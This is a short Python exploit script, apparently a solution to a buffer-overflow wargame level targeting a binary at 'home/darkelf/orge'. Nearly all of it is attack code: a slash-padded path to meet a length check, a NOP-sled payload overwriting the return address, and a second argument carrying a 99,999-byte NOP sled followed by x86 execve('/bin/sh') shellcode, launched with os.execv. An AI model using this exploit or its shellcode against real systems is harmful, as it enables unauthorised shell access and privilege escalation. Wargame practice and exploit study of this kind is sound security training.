import os
from struct import *

p = lambda x : pack("<L",x)
target1 = "home/darkelf/orge"
target0="/"*(77-len(target1))

target=target0+target1

ret=0xbffeffff

limit = 44

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload1="\x90"*limit+p(ret)
payload2="\x90"*99999+shellcode
os.execv(target,[target,payload1,payload2])